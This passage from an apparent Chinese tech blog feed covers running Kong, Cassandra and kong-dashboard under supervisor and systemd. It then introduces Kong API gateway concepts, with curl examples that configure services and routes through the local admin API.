class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# supervisorctl update kong-dashboard</span><br><span class="line">kong-dashboard: stopped</span><br><span class="line">kong-dashboard: updated process group</span><br><span class="line"></span><br><span class="line">[root@DWD-BETA ~]# supervisorctl status kong-dashboard</span><br><span class="line">kong-dashboard                   RUNNING   pid 16635, uptime 0:05:02</span><br></pre></td></tr></table></figure><p>启动完成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@DWD-BETA ~]# netstat -tulnp | grep 8081</span><br><span class="line">tcp6       0      0 :::8081                 :::*                    LISTEN      16635/node</span><br></pre></td></tr></table></figure><hr><h3 id="将cassandra加入到supervisor进程管理"><a href="#将cassandra加入到supervisor进程管理" class="headerlink" title="将cassandra加入到supervisor进程管理"></a>将cassandra加入到supervisor进程管理</h3><p>cassandra加入supervisor进程托管遇到不少问题.踩过以下2个坑:</p><p>1.启动报错,提示需要更高级版本的java.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br><span class="line">Cassandra 3.0 and later require Java 8u40 or later.</span><br></pre></td></tr></table></figure><p>我的解决方案:</p><ul><li>在cassandra的supervisor配置文件中加入环境变量:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environment=JAVA_HOME=&quot;/usr/local/java&quot;  #这样cassandra会识别用户自定义安装的Java.</span><br></pre></td></tr></table></figure><ul><li>配置软链</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/local/java/bin/java /usr/bin/java</span><br></pre></td></tr></table></figure><p>2.仍然无法启动,因为命令行是以daemon方式启动.在cassandra的supervisor配置文件中的启动参数加入-f选项.</p><p>最终的cassandra配置文件如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[program:cassandra]</span><br><span class="line">command=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">directory=/usr/local/cassandra/</span><br><span class="line">environment=JAVA_HOME=&quot;/usr/local/java&quot;</span><br><span class="line">enviroment=PATH=&quot;$JAVA_HOME/bin:$PATH&quot;</span><br><span class="line">priority=0</span><br><span class="line">numprocs=1</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/cassandra/cassandra_supervisor.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><hr><h3 id="将kong加入到supervisor"><a href="#将kong加入到supervisor" class="headerlink" title="将kong加入到supervisor"></a>将kong加入到supervisor</h3><p>1.由于默认kong启动是以daemon方式启动.所以修改/etc/kong/kong.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#将下列行修改为off,且取消注释</span><br><span class="line">nginx_daemon = off</span><br></pre></td></tr></table></figure><p>2.编辑kong的supervisor配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:kong]</span><br><span class="line">command=/usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">numprocs=1</span><br><span class="line">priority=0</span><br><span class="line">user=work</span><br><span class="line">stdout_logfile = /data/logs/kong/kong_supervisor.log</span><br><span class="line">redirect_stderr = true</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><blockquote><p>注意由于kong启动的时候会连接后端的cassandra数据库,所以需要先启动cassandra,再启动kong.这就是为什么supervisor里要加入priority参数.优先级越小,启动顺序越优先.停止顺序越靠后.     </p></blockquote><p><strong>但是经过我的验证,发现priority参数没什么鸟用.当我start all,stop all时.永远是cassandra进程首先启动和关闭,无论priority优先级是大还是小.而不是supervisor官网介绍的那样效果</strong></p><p>启动没问题:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 ~]$ supervisorctl status</span><br><span class="line">cassandra                        RUNNING   pid 13531, uptime 0:10:09</span><br><span class="line">kong                             RUNNING   pid 14460, uptime 0:00:35</span><br><span class="line">kong-dashboard                   RUNNING   pid 14496, uptime 0:00:17</span><br></pre></td></tr></table></figure><p>但是发现supervisor管理kong进程有很严重的问题.</p><p>因为kong启动后包括2个进程:kong和nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3198  0.2  0.0 130104  2700 ?        S    17:12   0:00 perl /usr/local/openresty/bin/resty /usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">work      3215  6.3  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br></pre></td></tr></table></figure><p>.这个时候如果用supervisorctl restart kong进程会出现无法启动的情况.这是因为supervisor kill掉了kong进程.但是没有kill Ningx进程.所以重新启动kong的时候,由于nginx进程仍然存在,故无法启动.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      2917  0.0  0.1 259600 11820 ?        S    17:05   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3191  0.0  0.0 112704   976 pts/0    S+   17:11   0:00 grep --color=auto kong</span><br><span class="line">[work@kong-node1 conf.d]$ kill 2917</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3193  0.0  0.0 112704   976 pts/0    S+   17:11   0:00 grep --color=auto kong</span><br><span class="line">[work@kong-node1 conf.d]$ supervisorctl start kong</span><br><span class="line">kong: started</span><br><span class="line"></span><br><span class="line">#kong启动后包含2个进程</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3198  0.2  0.0 130104  2700 ?        S    17:12   0:00 perl /usr/local/openresty/bin/resty /usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">work      3215  6.3  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3228  0.0  0.0 112704   976 pts/0    R+   17:12   0:00 grep --color=auto kong</span><br><span class="line"></span><br><span class="line">#supervisor关闭了Kong进程后,无法启动.</span><br><span class="line">[work@kong-node1 conf.d]$ supervisorctl restart kong</span><br><span class="line">kong: stopped</span><br><span class="line">kong: ERROR (spawn error)</span><br><span class="line"></span><br><span class="line">#因为虽然kong进程杀死了.但是nginx进程还在.所以kong的8000端口仍然被占用</span><br><span class="line">[work@kong-node1 conf.d]$ ps aux | grep kong</span><br><span class="line">work      3215  0.1  0.1 259600 11800 ?        S    17:12   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br><span class="line">work      3307  0.0  0.0 112704   976 pts/0    S+   17:15   0:00 grep --color=auto kong</span><br><span class="line"></span><br><span class="line">#查看启动日志,提示kong进程已经启动了.</span><br><span class="line">Error: Kong is already running in /data/kong</span><br><span class="line"></span><br><span class="line">  Run with --v (verbose) or --vv (debug) for more details</span><br></pre></td></tr></table></figure><p><strong>暂时就不用supervisor管理了,采用命令行直接启动方式</strong></p><hr><p><strong>命令行启动kong.只有一个Nginx进程.没有Perl进程.不知道何故</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 conf.d]$kong start -c /etc/kong/kong.conf</span><br><span class="line">Kong started</span><br><span class="line">[work@kong-node2 conf.d]$ps aux | grep kong</span><br><span class="line">work     15558  0.0  0.0 259600  6540 ?        Ss   17:29   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/kong -c nginx.conf</span><br></pre></td></tr></table></figure><hr><h3 id="将kong-Cassandra加入到systemctl管理工具"><a href="#将kong-Cassandra加入到systemctl管理工具" class="headerlink" title="将kong,Cassandra加入到systemctl管理工具"></a>将kong,Cassandra加入到systemctl管理工具</h3><ul><li><strong>cassandra</strong></li></ul><p>systemctl文件如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 ~]$cd /usr/lib/systemd/system</span><br><span class="line">[work@kong-node1 system]$vim cassandra.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Cassandra</span><br><span class="line">After=network.target</span><br><span class="line">Before=kong.target </span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">ExecStart=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">ExecStop=kill $(pgrep -f cassandra)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><blockquote><p>注意.如果java是二进制包,则需要将Bin文件链接到系统环境变量目录下.因为systemctl不会读取profile环境,所以不能识别到java.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 system]$which java</span><br><span class="line">/usr/bin/java</span><br><span class="line">[work@kong-node1 system]$ll /usr/bin/java</span><br><span class="line">lrwxrwxrwx 1 root root 24 Nov 14 17:46 /usr/bin/java -&gt; /usr/local/java/bin/java</span><br></pre></td></tr></table></figure><p>第二种方法是在systemctl中指定环境变量.指定environment参数(这种方法理论可行,但是没有论证)</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Cassandra</span><br><span class="line">After=network.target</span><br><span class="line">Before=kong.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">environment=JAVA_HOME=/usr/local/java</span><br><span class="line">environment=PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">ExecStart=/usr/local/cassandra/bin/cassandra -f</span><br><span class="line">ExecStop=kill $(pgrep -f cassandra)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><hr><ul><li><strong>kong</strong></li></ul><p>在同目录下编辑kong服务配置.</p><blockquote><p>注意,需要在cassandra后端数据库启动后,才能启动kong服务</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 system]$vim kong.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description= kong service</span><br><span class="line">After=syslog.target network.target cassandra.target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/local/bin/kong start -c /etc/kong/kong.conf</span><br><span class="line">ExecReload=/usr/local/bin/kong reload -c /etc/kong/kong.conf</span><br><span class="line">ExecStop=/usr/local/bin/kong stop</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li><strong>在kong-node2上启动kong-dashbaord</strong></li></ul><blockquote><p>dashbaord服务启动需要在cassandra,kong服务启动之后</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node2 system]$vim kong-dashboard.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=kong-dashboard</span><br><span class="line">After=network.target cassandra.target kong.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=work</span><br><span class="line">Group=work</span><br><span class="line">ExecStart=/usr/local/bin/kong-dashboard start --kong-url http://10.111.30.158:8001</span><br><span class="line">ExecStop=kill $(pgrep -f kong-dashboard)</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><ul><li>加入到开启自启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable cassandra</span><br><span class="line">systemctl enable kong</span><br><span class="line">systemctl enable kong-dashboard</span><br></pre></td></tr></table></figure><p>经过反复论证,systemctl可以管理以上服务.</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;kong-casssandra集群环境部署&quot;&gt;&lt;a href=&quot;#kong-casssandra集群环境部署&quot; class=&quot;headerlink&quot; title=&quot;kong+casssandra集群环境部署&quot;&gt;&lt;/a&gt;kong+casssandra集群环境部署&lt;/h2&gt;&lt;h3 id=&quot;kong简介&quot;&gt;&lt;a href=&quot;#kong简介&quot; class=&quot;headerlink&quot; title=&quot;kong简介&quot;&gt;&lt;/a&gt;kong简介&lt;/h3&gt;&lt;p&gt;Kong是Mashape开源的一款API网关，起初是用来管理 Mashape 公司15000个微服务的，后来在2015年开源,现在已经在很多创业公司、大型企业和政府机构中广泛使用。基于nginx,Lua和Cassandra或PostgreSQL，支持分布式操作，有很强的可移植性和可扩展性。可以在任何一种基础设施上运行,作为应用和API之间的中间层，加上众多功能强大的插件，可以实现认证授权、访问控制等功能。并且提供易于使用的RESTful API来操作和配置系统。&lt;/p&gt;
&lt;p&gt;有关kong的详细介绍请参考官网.&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-分布式&amp;消息队列" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="kong" scheme="https://jesse.top/tags/kong/"/>
    
  </entry>
  
  <entry>
    <title>kong API网关介绍及API接口配置</title>
    <link href="https://jesse.top/2018/11/20/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kong/kong%20API%E7%BD%91%E5%85%B3%E4%BB%8B%E7%BB%8D%E5%8F%8AAPI%E6%8E%A5%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
    <id>https://jesse.top/2018/11/20/Linux-分布式&amp;消息队列/kong/kong API网关介绍及API接口配置/</id>
    <published>2018-11-20T04:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.015Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kong-API网关介绍及API接口配置"><a href="#kong-API网关介绍及API接口配置" class="headerlink" title="kong API网关介绍及API接口配置"></a>kong API网关介绍及API接口配置</h2><p>上一篇讲解了kong+cassandra的部署安装方法.接下来讲解一下kong的API配置.官网上也有详细的api介绍.</p><p>下面简单讲解一下kong的各个api组件:</p><a id="more"></a><h4 id="service"><a href="#service" class="headerlink" title="* service"></a>* service</h4><p>Service 顾名思义，就是我们自己定义的上游服务，通过Kong匹配到相应的请求要转发的地方</p><p>Service 可以与下面的Route进行关联，一个Service可以有很多Route，匹配到的Route就会转发到Service中.<br>​<br>当然中间也会通过Plugin的处理，增加或者减少一些相应的Header或者其他信息</p><p>Service可以是一个实际的地址，也可以是定义的一个upstream</p><hr><h4 id="route"><a href="#route" class="headerlink" title="* route"></a>* route</h4><p>   Route 字面意思就是路由，实际就是我们通过定义一些规则来匹配客户端的请求，每个路由都会关联一个Service,并且Service可以关联多个Route，当匹配到客户端的请求时，每个请求都会被代理到其配置的Service中</p><p>Route作为客户端的入口，通过将Route和Service的松耦合，可以通过hosts path等规则的配置，最终让请求到不同的Service中</p><p>例如，我们规定api.example.com 和 api.service.com的登录请求都能够代理到123.11.11.11:8000端口上，那我们可以通过hosts和path来路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 创建一个Service s1，其相应的host和port以及协议为http://123.11.11.11:8000</span><br><span class="line"></span><br><span class="line">2. 创建一个Route，关联的Service为s1，其hosts为[api.service.com, api.example.com],path为login</span><br><span class="line"></span><br><span class="line">3. 将域名api.example.com和api.service.com的请求转到到我们的Kong服务器的前面的负载均衡调度器上</span><br><span class="line"></span><br><span class="line">那么，当我们请求api.example.com/login和api.service.com/login时，其通过Route匹配，然后转发到Service，最终将会请求我们自己的服务。</span><br></pre></td></tr></table></figure><hr><h4 id="upstream"><a href="#upstream" class="headerlink" title="* upstream"></a>* upstream</h4><p>和nginx的upstream概念一模一样..这是指您自己的后端真实服务器位于Kong后面，客户端请求被转发到该服务器。<br>相当于Kong提供了一个负载的功能，基于Nginx的虚拟主机的方式做的负载功能</p><p>当我们部署集群时，一个单独的地址不足以满足我们的时候，我们可以使用Kong的upstream来进行设置</p><p>upstream的功能和nginx也类似,可以指定后端真实的target服务器.还提供健康检查机制</p><hr><h4 id="target"><a href="#target" class="headerlink" title="* target"></a>* target</h4><p>target 就是在upstream进行负载均衡的终端，当我们部署集群时，需要将每个节点作为一个target，并设置负载的权重，当然也可以通过upstream的设置对target进行健康检查。<br>​<br>当我们使用upstream时，整个路线是 Route &gt;&gt; Service &gt;&gt; Upstream &gt;&gt; Target </p><hr><h4 id="api"><a href="#api" class="headerlink" title="* api"></a>* api</h4><p>用于表示您的上游服务的传统实体。自0.13.0起已经被弃用。</p><hr><h4 id="consumer"><a href="#consumer" class="headerlink" title="* consumer"></a>* consumer</h4><p>Consumer 可以代表一个服务，可以代表一个用户，也可以代表消费者，可以根据我们自己的需求来定义</p><p>可以将一个Consumer对应到实际应用中的一个用户，也可以只是作为一个Service的请求消费者</p><hr><h4 id="plugin"><a href="#plugin" class="headerlink" title="* plugin"></a>* plugin</h4><p>kong官方提供了各种各样的插件,比如限流,认证,签名,http远程日志等..这些插件在请求被代理到上游API之前或之后执行。例如，请求之前的Authentication或者是请求限流插件的使用</p><p>Plugin可以和Service绑定，也可以和Route以及Consumer进行关联。当和不同的kong组件进行绑定时,插件的作用范围也不同.</p><hr><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>官方提供了详细的配置参数 <a href="https://docs.konghq.com/0.14.x/admin-api/#add-service" target="_blank" rel="noopener">admin api</a></p><p>可以通过curl命令行来配置各个API组件,也可以通过kong-dashboard的UI界面配置.这里演示命令行的配置方法</p><h4 id="service配置"><a href="#service配置" class="headerlink" title="* service配置"></a>* service配置</h4><p>下面的例子中注册一个service.名字是betaapi,协议是http.主机是上游的upstream后端服务器组:beta_background_server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">work@DWD-BETA conf]$ curl  -X POST --url http://localhost:8001/services/ \</span><br><span class="line">&gt; --data &apos;name=betaapi&apos; \</span><br><span class="line">&gt; --data &apos;protocol=http&apos; \</span><br><span class="line">&gt; --data &apos;host=beta_background_server&apos;</span><br></pre></td></tr></table></figure><p>执行结果</p><p>包含的信息有创建时间,service这个api组件的ID.以及一些默认参数,比如retries,write_timeout</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;host&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">    &quot;created_at&quot;:1541230207,</span><br><span class="line">    &quot;connect_timeout&quot;:60000,</span><br><span class="line">    &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,</span><br><span class="line">    &quot;protocol&quot;:&quot;http&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;betaapi&quot;,</span><br><span class="line">    &quot;read_timeout&quot;:60000,</span><br><span class="line">    &quot;port&quot;:80,</span><br><span class="line">    &quot;path&quot;:null,</span><br><span class="line">    &quot;updated_at&quot;:1541230207,</span><br><span class="line">    &quot;retries&quot;:5,</span><br><span class="line">    &quot;write_timeout&quot;:60000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看service配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -i -X GET http://localhost:8001/services</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 03 Nov 2018 07:54:25 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Server: kong/0.14.1</span><br><span class="line">Content-Length: 285</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;next&quot;:null,</span><br><span class="line">    &quot;data&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;host&quot;:&quot;beta_background_server&quot;,</span><br><span class="line">            &quot;created_at&quot;:1541230207,</span><br><span class="line">            &quot;connect_timeout&quot;:60000,</span><br><span class="line">            &quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,</span><br><span class="line">            &quot;protocol&quot;:&quot;http&quot;,</span><br><span class="line">            &quot;name&quot;:&quot;betaapi&quot;,</span><br><span class="line">            &quot;read_timeout&quot;:60000,</span><br><span class="line">            &quot;port&quot;:80,</span><br><span class="line">            &quot;path&quot;:null,</span><br><span class="line">            &quot;updated_at&quot;:1541230207,</span><br><span class="line">            &quot;retries&quot;:5,</span><br><span class="line">            &quot;write_timeout&quot;:60000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改配置可以使用PATCH方法,例如将service的名字修改为BETA</p><p>修改的时候需要指定要修改的service或者route等组件的ID.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PATCH http://localhost:8001/services/bb45687e-7cf5-48b2-b3ae-6847e28736bf/ \</span><br><span class="line">&gt; --data &apos;name=beta&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;host&quot;:&quot;beta_background_server&quot;,&quot;created_at&quot;:1541230207,&quot;connect_timeout&quot;:60000,&quot;id&quot;:&quot;bb45687e-7cf5-48b2-b3ae-6847e28736bf&quot;,&quot;protocol&quot;:&quot;http&quot;,&quot;name&quot;:&quot;beta&quot;,&quot;read_timeout&quot;:60000,&quot;port&quot;:80,&quot;path&quot;:null,&quot;updated_at&quot;:1541231842,&quot;retries&quot;:5,&quot;write_timeout&quot;:60000&#125;</span><br></pre></td></tr></table></figure><h4 id="route配置"><a href="#route配置" class="headerlink" title="* route配置"></a>* route配置</h4><p>route定义为访问某个服务的路径,类似于网络设备中的路由的概念,它定义了访问某个服务或者域名(目的地)时,转交给某个service组件(类似于下一跳).</p><p>例如:访问m.betaapi.haoshiqi.net的请求就转交给刚才定义的service</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@DWD-BETA conf]$ curl -X POST --url http://localhost:8001/routes/ \</span><br><span class="line">&gt; --data &apos;service.id=bb45687e-7cf5-48b2-b3ae-6847e28736bf&apos; \</span><br><span class="line">&gt; --data &apos;protocols[]=http&apos; \</span><br><span class="line">&gt; --data &apos;protocols[]=https&apos; \</span><br><span class="line">&gt; --data &apos;methods[]=GET&amp;methods[]=POST&apos; \</span><br><span class="line">&gt; --data &apos;hosts[]=m.betaapi.haoshiqi.net&apos;</span><br></pre></td></tr></table></figure><p>这里我只定义了methods和protocols.没有定义path.这3个参数必须指定一个.它表示了访问目的服务(m.betaapi.haoshiqi.net)的方法和协议,或者具体路径.</p><p>我使用了2种写法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--data &apos;protocols[]=http&apos; \</span><br><span class="line">--data &apos;protocols[]=https&apos; \</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methods[]=GET&amp;methods[]=POST&apos;</span><br></pre></td></tr></table></figure><p>执行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 